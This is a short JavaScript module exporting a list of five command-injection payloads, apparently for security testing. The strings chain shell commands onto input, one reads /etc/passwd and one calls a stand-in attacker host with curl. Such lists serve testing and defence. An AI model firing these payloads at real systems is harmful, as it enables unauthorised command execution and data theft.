export const commandInjectionPayloads = [
  "; ls -la",
  "| cat /etc/passwd",
  "&& whoami",
  "`id`",
  "$(curl attacker.com)",
];
